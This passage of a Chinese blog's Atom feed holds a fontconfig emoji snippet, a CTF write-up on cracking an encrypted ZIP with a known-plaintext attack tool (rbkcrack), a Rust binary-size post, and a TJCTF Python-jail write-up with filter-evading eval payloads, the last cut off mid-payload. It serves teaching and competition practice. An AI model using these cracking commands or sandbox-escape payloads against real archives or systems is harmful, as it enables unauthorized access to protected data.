class="tag">&lt;<span class="name">match</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span> <span class="attr">name</span>=<span class="string">"family"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>serif<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">"family"</span> <span class="attr">mode</span>=<span class="string">"prepend"</span> <span class="attr">binding</span>=<span class="string">"strong"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Blobmoji<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span> <span class="attr">name</span>=<span class="string">"family"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>monospace<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">"family"</span> <span class="attr">mode</span>=<span class="string">"prepend"</span> <span class="attr">binding</span>=<span class="string">"strong"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Blobmoji<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">match</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span> <span class="attr">name</span>=<span class="string">"family"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>Apple Color Emoji<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">edit</span> <span class="attr">name</span>=<span class="string">"family"</span> <span class="attr">mode</span>=<span class="string">"prepend"</span> <span class="attr">binding</span>=<span class="string">"strong"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Blobmoji<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">edit</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">match</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">fontconfig</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再执行 <code>fc-cache -f -v</code>, 果冻人就回来了!~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;默认emoji太丑, 没有颜色, 看着浑身难受.&lt;/p&gt;
&lt;p&gt;还是喜欢果冻人...&lt;/p&gt;
    
    </summary>
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>ZIP 明文攻击工具</title>
    <link href="https://www.aloxaf.com/2018/10/zip_crack/"/>
    <id>https://www.aloxaf.com/2018/10/zip_crack/</id>
    <published>2018-10-04T13:47:12.000Z</published>
    <updated>2018-10-04T13:47:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>这个国庆假期抽了点风......</p><p>写了一个假期的代码......</p><a id="more"></a><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>前两天自己也不记得受了啥刺激写了个 <a href="https://github.com/Aloxaf/ren3/" target="_blank" rel="noopener">ren3</a>. </p><p>写完以后大概是处于亢奋状态, 突然又想开坑, 然后又花了四天完成了</p><ul><li><a href="https://github.com/Aloxaf/rbkcrack" target="_blank" rel="noopener">rbkcrack</a> fork 了 bkcrack, 然后用 Rust 重(zhao)写(chao), 再然后用 <code>zip-rs·改</code> 替换掉手写的 parser, 实现了对 ZIP64 的一定程度上的兼容, 再顺便加上解压. 实测成功破解了 20+GB 的zip文件.</li><li><a href="https://github.com/Aloxaf/p7zip" target="_blank" rel="noopener">p7zip</a> 稍微改了一下计算秘钥的部分, 允许使用 <code>-p[key1_key2_key3]</code> 这种格式来直接指定三个 key.  (世界上最遥远的距离, 不是生与死, 而是我都拿到 keys 了,  却找不到工具解压......)</li></ul><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>就拿以前测试时出的一道题为例, 下载地址文末</p><blockquote><p>两个flag, 一个在flag.txt里, 一个在big_file开头</p><p>big_file里的那个我自己也弄不出来, 就又加了一个flag.txt</p><p>给了两个已知明文</p><p>hashcat是一开始随手加进来的, libc是后来为了测试工具随手加进来的</p><p>所以这里没有坑</p><p>PS. 17位大小写数字混合密码, 不用试图爆破...</p></blockquote><p>cipher.zip 里有4个文件, big_file 和 flag.txt 是等待破解的.</p><p>其中 big_file 压缩前大小高达 4.8 GiB, 使得这个 ZIP 文件包含了 ZIP64 格式. </p><blockquote><p>这个地方没有说这个文件是 ZIP64 格式, 而是说它包含了 ZIP64 格式.<br>因为一个 ZIP 文件理论上是可以包含多种压缩算法&amp;格式(好像是这样的), 所以我们可以选择其中的原始 ZIP 格式进行破解.</p></blockquote><p>然而面对这样的一个文件 pkcrack 和 AZPR 都会给出 <code>unknown signature</code> 一类的报错. 直接把路堵死了... </p><blockquote><p>其实 pkcrack 把报错代码注释掉就能跑了</p></blockquote><p>这个地方我们使用 rbkcrack. </p><blockquote><p>它的前身 bkcrack 其实也能爆破, 不过作者手写的 parser 完全没有考虑 ZIP64 格式, 在面对复杂文件时可能会跪...</p></blockquote><p>题目给了两个明文, libc 那个比较大, 爆破起来比较快. 于是执行如下命令开始攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack -c libc-2.23.so -p libc-2.23.so -C cipher.zip -P plain2.zip</span><br></pre></td></tr></table></figure><p>只花费了五秒钟就得到了keys.</p><p>PS. 重写完 bkcrack 后我拿一个文件测试了一下, 发现 Rust 版竟然比 C++ 版还快了 15%...... (改用 sort_unstabe 以后快了 25%......)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Generated 4194304 Z values.</span><br><span class="line">[22:11:22] Z reduction using 4512917 extra bytes of known plaintext</span><br><span class="line">0.11 % (4855 / 4512917)</span><br><span class="line">240 values remaining.</span><br><span class="line">[22:11:26] Attack on 240 Z values at index 4509032</span><br><span class="line">5.00 % (12 / 240)</span><br><span class="line">[22:11:27] Keys</span><br><span class="line">d4f34b9d a6ba3461 dcd97451</span><br></pre></td></tr></table></figure><p>得到 keys 以后直接使用如下代码可以从 cipher.zip 中解压 flag.txt.<br>(这个地方没有加 -u 开关, 因为 flag.txt 的压缩方式是 store)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack -c flag.txt -C cipher.zip -k d4f34b9d a6ba3461 dcd97451 -d ./flag.txt</span><br></pre></td></tr></table></figure><p>然后得到了第一个 flag: <code>flag{Th3Re_1s_Ano1h3r_f1ag_in_big_file}</code></p><p>big_file 是实打实的压缩过的, 需要加上 -u 开关提取. 由于文件非常大, 而且我们只要前面的一部分, 所以当看到 big_file 大小差不多了就可以 Ctrl+C 了.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbkcrack -c big_file -C cipher.zip -k d4f34b9d a6ba3461 dcd97451 -d ./big_file -u</span><br></pre></td></tr></table></figure><p>head 一下然后就得到了第二个 flag: <code>flag{Th1s_i3_A_tE5t}</code></p><p>最后强行给 p7zip 一个出场机会, 虽然做题的时候不大可能用到, 但是真要用来干大事儿还是它靠谱.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7za e cipher.zip <span class="string">'-p[d4f34b9d_a6ba3461_dcd97451]'</span></span><br></pre></td></tr></table></figure><p>下载地址: <a href="http://storage.aloxaf.cn/storage/fucking_problem.zip" target="_blank" rel="noopener nofollow">fucking_problem.zip</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个国庆假期抽了点风......&lt;/p&gt;
&lt;p&gt;写了一个假期的代码......&lt;/p&gt;
    
    </summary>
    
      <category term="ctf" scheme="https://www.aloxaf.com/categories/ctf/"/>
    
    
      <category term="rust" scheme="https://www.aloxaf.com/tags/rust/"/>
    
      <category term="ctf" scheme="https://www.aloxaf.com/tags/ctf/"/>
    
      <category term="misc" scheme="https://www.aloxaf.com/tags/misc/"/>
    
      <category term="zip" scheme="https://www.aloxaf.com/tags/zip/"/>
    
  </entry>
  
  <entry>
    <title>优化 Rust 程序编译体积</title>
    <link href="https://www.aloxaf.com/2018/09/reduce_rust_size/"/>
    <id>https://www.aloxaf.com/2018/09/reduce_rust_size/</id>
    <published>2018-09-07T04:27:05.000Z</published>
    <updated>2018-12-20T14:56:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>体积狂魔の执念, 记录一下以免忘记.</p><p>[2018.12.20] 今天测了一下发现体积大幅减小了, 回忆了一下也许是把内存分配器换成了系统自带的原因. 这也提醒了我要记录一下 Rust 版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➤ rustc --version</span><br><span class="line">rustc 1.32.0-beta.2 (a01e4761a 2018-12-08)</span><br></pre></td></tr></table></figure><a id="more"></a><p>新建一个项目, 直接编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">▶ cargo new --bin hello</span><br><span class="line">     Created binary (application) `hello` project</span><br><span class="line">▶ cd hello</span><br><span class="line">▶ cargo build --release</span><br><span class="line">   Compiling hello v0.1.0 (file:///tmp/hello)</span><br><span class="line">    Finished release [optimized] target(s) in 0.45s</span><br><span class="line">▶ du -h target/release/hello </span><br><span class="line">2.3M    target/release/hello</span><br></pre></td></tr></table></figure><p>一个 hello world 2.3M, 太大了. // 原来是 3.9M</p><p>strip 一下.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">▶ strip -s target/release/hello</span><br><span class="line">▶ du -h target/release/hello</span><br><span class="line">196K    target/release/hello</span><br></pre></td></tr></table></figure><p>196K, 这个体积已经可以接受了, 不过我还是想知道还可以有多小. // 原来是 420K</p><p>在Cargo.toml中添加</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[profile.release]</span></span><br><span class="line"><span class="attr">panic</span> = <span class="string">'abort'</span></span><br><span class="line"><span class="attr">lto</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">opt-level</span> = <span class="string">"z"</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">▶ cargo build --release &amp;&amp; strip -s target/release/hello &amp;&amp; du -h target/release/hello</span><br><span class="line">   Compiling hello v0.1.0 (file:///tmp/hello)</span><br><span class="line">    Finished release [optimized] target(s) in 1.73s</span><br><span class="line">164K    target/release/hello</span><br></pre></td></tr></table></figure><p>164K, 再次进步. 不过这还不够! // 原来是 180K</p><p><strong>超必杀技</strong>: 注释掉 panic 和 lto 两行, 然后使用动态链接.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">▶ RUSTFLAGS='-C prefer-dynamic' cargo build --release </span><br><span class="line">   Compiling hello v0.1.0 (file:///tmp/hello)</span><br><span class="line">    Finished release [optimized] target(s) in 0.14s</span><br><span class="line">▶ du -h target/release/hello</span><br><span class="line">20K     target/release/hello</span><br><span class="line">▶ strip -s target/release/hello</span><br><span class="line">▶ du -h target/release/hello</span><br><span class="line">16K     target/release/hello</span><br></pre></td></tr></table></figure><p>16K!! <strong>非常满意</strong>. <del>除了无法运行之外</del></p><p>(可以看到链接了一个莫名其妙的 libstd-affa4edaee4ff43e.so)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">▶ ldd target/release/hello</span><br><span class="line">        linux-vdso.so.1 (0x00007ffd6f4b4000)</span><br><span class="line">        libstd-affa4edaee4ff43e.so =&gt; not found</span><br><span class="line">        libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007f02e5e5a000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f02e6077000)</span><br></pre></td></tr></table></figure><p>Google 了一下这个问题已经有人提出了 <a href="https://github.com/rust-lang/rust/issues/45601" target="_blank" rel="noopener">Avoid the <code>proc_macro</code> crate being dynamically linked.</a><br>也已经有人着手修复了 <a href="https://github.com/rust-lang/rust/pull/49219" target="_blank" rel="noopener">Decouple proc_macro from the rest of the compiler.</a></p><p>坐等</p><p>P.S. <code>-C</code>开关可供把玩的选项似乎很多啊, 比如 <code>-C target-cpu=native</code>提高程序本机运行速度</p><p>[2018.12.20] 那个 PR 已经合并了, 然而问题还是没有解决...我又探究了一下, 发现我其实可以运行这个 bin</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➤ LD_LIBRARY_PATH=~/.rustup/toolchains/beta-x86_64-unknown-linux-gnu/lib:. ./target/release/hello</span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure><p>这玩意儿原来是 runtime...我早该想到的orz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➤ du -h /home/aloxaf/.rustup/toolchains/beta-x86_64-unknown-linux-gnu/lib/libstd-affa4edaee4ff43e.so</span><br><span class="line">5.4M    /home/aloxaf/.rustup/toolchains/beta-x86_64-unknown-linux-gnu/lib/libstd-affa4edaee4ff43e.so</span><br></pre></td></tr></table></figure><p>然后, 由于 Rust 还没有稳定的 ABI (<a href="https://github.com/rust-lang/rfcs/issues/600" target="_blank" rel="noopener">RFC#600</a>), 所以这个问题暂时还是无解状态. 如果有稳定 ABI 了, 咱就可以 <code>pacman -S rust-common</code> 啥的, 然后就可以享受超小体积的二进制了!  </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;体积狂魔の执念, 记录一下以免忘记.&lt;/p&gt;
&lt;p&gt;[2018.12.20] 今天测了一下发现体积大幅减小了, 回忆了一下也许是把内存分配器换成了系统自带的原因. 这也提醒了我要记录一下 Rust 版本&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;➤ rustc --version&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rustc 1.32.0-beta.2 (a01e4761a 2018-12-08)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="rust" scheme="https://www.aloxaf.com/categories/rust/"/>
    
    
      <category term="rust" scheme="https://www.aloxaf.com/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>TJCTF 2018 中两道 Python Jail 的解法</title>
    <link href="https://www.aloxaf.com/2018/08/tjctf_pythonjail/"/>
    <id>https://www.aloxaf.com/2018/08/tjctf_pythonjail/</id>
    <published>2018-08-11T04:23:25.000Z</published>
    <updated>2018-08-11T04:23:25.000Z</updated>
    
    <content type="html"><![CDATA[<p>感谢 M4x 师傅推荐了这个比赛, 虽然是面向美国高中生, 不过打了以后还是有点收获的.<br><del>同时内心受到一万点暴击伤害</del> </p><p>尤其是两道 Python jail, 非常硬却失挺.<br>(下载地址在文末)</p><a id="more"></a><h1 id="Mirror-Mirror"><a href="#Mirror-Mirror" class="headerlink" title="Mirror Mirror"></a>Mirror Mirror</h1><p>连进去以后会收到一个提示</p><blockquote><p>Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!</p></blockquote><p>不多说废话了, 这个环境无法 import, 也过滤了 双下划线, 和 getattr, eval, execfile, reload, file 等大量有用的函数,<br>经典的 payload 基本无法使用.</p><p>题目提示使用 <code>get_flag()</code>, 而且强调参数要包裹在两层括号中.<br>然而试一下会发现完全没有卵用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; get_flag(&apos;&quot;a&quot;&apos;)</span><br><span class="line">a is not a valid character</span><br><span class="line">&gt;&gt;&gt; get_flag(&apos;&quot;1&quot;&apos;)</span><br><span class="line">1 is not a valid character</span><br><span class="line">&gt;&gt;&gt; get_flag(&apos;&quot;[&quot;&apos;)</span><br><span class="line">You didn&apos;t guess the value of my super_secret_string</span><br><span class="line">&gt;&gt;&gt; get_flag(&apos;[&apos;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;console&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">  File &quot;/home/app/problem.py&quot;, line 23, in get_flag</span><br><span class="line">    if(eval(input) == super_secret_string):</span><br><span class="line">  File &quot;&lt;string&gt;&quot;, line 1</span><br><span class="line">    [</span><br><span class="line">    ^</span><br><span class="line">SyntaxError: unexpected EOF while parsing</span><br></pre></td></tr></table></figure><h2 id="我猜想的标准解法"><a href="#我猜想的标准解法" class="headerlink" title="我猜想的标准解法"></a>我猜想的标准解法</h2><p> 通过 <code>get_flag.func_code.co_consts</code> 拿到函数内的常量, 得到 super_secret_string 的值.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.func_code.co_consts</span><br><span class="line">(<span class="keyword">None</span>, <span class="string">'this_is_the_super_secret_string'</span>, <span class="number">48</span>, <span class="number">57</span>, <span class="number">65</span>, <span class="number">90</span>, <span class="number">97</span>, <span class="number">122</span>, <span class="number">44</span>, <span class="number">95</span>, <span class="string">' is not a valid character'</span>, <span class="string">'%\xcb'</span>, <span class="string">"You didn't guess the value of my super_secret_string"</span>)</span><br></pre></td></tr></table></figure><p>然后发现后面那一串数字代表的正好是 <code>09AZaz,_</code> 这几个字符,<br>于是判断过滤了 <code>0~9</code>, <code>A-Z</code> 和 <code>,</code> <code>_</code> 这两个字符.</p><p>再联想到题目让我们用两层括号和前面的报错, 判断应该是对我们的输入进行了eval, 那么具体思路就是:<br>不用 <code>0~9</code>, <code>A-Z</code> 和 <code>,</code> <code>_</code>  构造一个字符串 s, 使 <code>eval(s) == &#39;this_is_the_super_secret_string&#39;</code>.</p><p>实现的方法是个挺著名的技巧, Google 搜 python jail 就能很轻松地搜到.<br><a href="http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/" target="_blank" rel="noopener">plaidctf-pyjail-story-of-pythons-escape</a></p><p>简单地讲一下这篇文章讲了啥 (<strong>仅限Python2</strong>):</p><p>在 Python2 中, 利用 <code>[] &lt; []</code> 可以得到 False, <code>{} &lt; []</code> 可以得到 True (都是什么鬼). 再利用 True 和 False 在进行数学运算时表现类似 1 和 0 的特性, 就可以通过运算得到任意数字. 作者给出了一个脚本来进行这种转换. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brainfuckize</span><span class="params">(nb)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> nb <span class="keyword">in</span> [<span class="number">-2</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">"~(&#123;&#125;&lt;[])"</span>, <span class="string">"~([]&lt;[])"</span>,</span><br><span class="line">                 <span class="string">"([]&lt;[])"</span>,  <span class="string">"(&#123;&#125;&lt;[])"</span>][nb+<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> nb % <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"~%s"</span> % brainfuckize(~nb)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"(%s&lt;&lt;(&#123;&#125;&lt;[]))"</span> % brainfuckize(nb/<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>有了数字, 我们就可以利用 <code>&quot;%c&quot; % n</code> 这种方式来得到字符了,  不过这个地方 c 仍然是字母, 必须再想办法换掉.</p><p>作者提出了这种方式来获取 <code>%c</code> :   <code>`&#39;%\xcb&#39;`[1::3]</code> , 这是一个十分巧妙的方式. 首先 <code>&#39;%\xcb&#39;</code> 代表了两个字符, <code>%</code> 和 <code>\xcb</code> , 这两者都不在过滤列表内 ( 可以用 <code>[i for i in &quot;`&#39;%\xca&#39;`&quot;]</code>验证一下), 然后, 利用 ``(即repr的语法糖) 可以再次得到这串字符串的原始形式(相当于 eval 的反函数), 即由<code>&#39; % \ x c b &#39;</code> 七个字符组成的字符串. 现在再用下标将他们取出, 就能得到 <code>%c</code> 了, 然后就可以愉快地得到任意字符了.</p><p>接下来要把字符拼接成字符串, 对于本题来说我觉得直接 <code>+</code> 就可以了, 不过作者似乎对 repr 情有独钟, 采用了 <code>`[&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;]`[2::5]</code> 这种方式来得到字符串 <code>abcd</code> ...</p><p>这个地方我们用<code>+</code>拼接, 直接给出 payload 的生成代码. <span style="background-color: #555">应该没人打算手写吧</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+'</span>.join([<span class="string">"`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % "</span> + brainfuckize(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'this_is_the_super_secret_string'</span>])</span><br></pre></td></tr></table></figure><p>解释: 先用 <code>brainfuckize(ord(i))</code> 得到每个字符对应 ASCII 码的 brainfuck 形式. 再拼接在 <code>&quot;`&#39;%\xcb&#39;`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))] % &quot;</code> 后面, 就得到了一段 eval 后可以得到对应字符的代码, 然后把这一堆代码用<code>+</code> 拼接起来就可以得到最终 payload 了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ((~(~(~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (((~(~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~((~(~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((((~((&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~((~(~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((((~((&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ((~(~(~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (((~(~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % 